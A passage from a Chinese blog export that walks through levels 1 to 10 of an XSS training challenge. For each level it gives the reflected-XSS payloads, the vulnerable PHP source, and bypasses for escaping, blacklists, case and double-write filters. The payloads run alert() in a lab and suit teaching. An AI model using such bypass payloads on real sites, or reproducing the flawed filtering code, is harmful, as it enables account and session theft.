rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS Challenge</title>
      <link href="/2019/05/20/XSS-Challenge/"/>
      <url>/2019/05/20/XSS-Challenge/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558054268267.png" alt="1558054268267"></p><p>跳转到如下页面</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558054405501.png" alt="1558054405501"></p><p>发现url通过get方法传递参数</p><p>修改参数为666</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558054498678.png" alt="1558054498678"></p><p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558054637265.png" alt="1558054637265"></p><p>没有任何过滤，成功执行payload</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：没有做任何过滤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558054961618.png" alt="1558054961618"></p><p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558055118753.png" alt="1558055118753"></p><p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p><p>接下来对另一处进行构造</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558055268881.png" alt="1558055268881"></p><p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558055385539.png" alt="1558055385539"></p><p>成功执行payload，便于查看代码，我把alert去掉</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558055539475.png" alt="1558055539475"></p><p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p><p>两种方法：</p><ol><li><p>不逃逸input标签，闭合引号添加事件触发xss</p><p>鼠标移动至该标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>逃逸出input标签,使用其他标签触发xss</p><p><code>&lt;script&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>等等</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558056793437.png" alt="1558056793437"></p><p>看起来跟level一样，试一下闭合掉value属性</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558057130653.png" alt="1558057130653"></p><p>闭合语句虽然没有问题，但是看起来被转义掉了</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558056967968.png" alt="1558056967968"></p><p>双引号被转义，再尝试一下单引号<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558057294923.png" alt="1558057294923"></p><p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p><p>再尝试另一种办法，添加事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558057537275.png" alt="1558057537275"></p><p>可以看到成功触发事件属性里的js代码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558057712688.png" alt="1558057712688"></p><p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>成功执行payload</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558096380758.png" alt="1558096380758"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558096540426.png" alt="1558096540426"></p><p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p><p>使用非<code>&lt;script&gt;</code>的html标签绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558098248009.png" alt="1558098248009"></p><p>使用触发事件绕过</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558098351438.png" alt="1558098351438"></p><p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558100639552.png" alt="1558100639552"></p><p>src被过滤</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558100187489.png" alt="1558100187489"></p><p>href被过滤</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558100233619.png" alt="1558100233619"></p><p>on被过滤，事件属性不行了</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558100422464.png" alt="1558100422464"></p><p>有一点点尬住了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有使用strtolower()函数，可以大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558105060724.png" alt="1558105060724"></p><p>on没了，被替换为空，接着试一下标签逃逸</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558105341248.png" alt="1558105341248"></p><p>src和script也没了</p><p>想到了双写，成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558105662485.png" alt="1558105662485"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558105893509.png" alt="1558105893509"></p><p>试一下标签逃逸</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558106118797.png" alt="1558106118797"></p><p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558248807926.png" alt="1558248807926"></p><p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558248919987.png" alt="1558248919987"></p><p>那就继续构造带 <code>http://</code> 的拼接语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558249256987.png" alt="1558249256987"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558250497766.png" alt="1558250497766"></p><p>但是没有提交按钮和提交页面</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558250601339.png" alt="1558250601339"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span 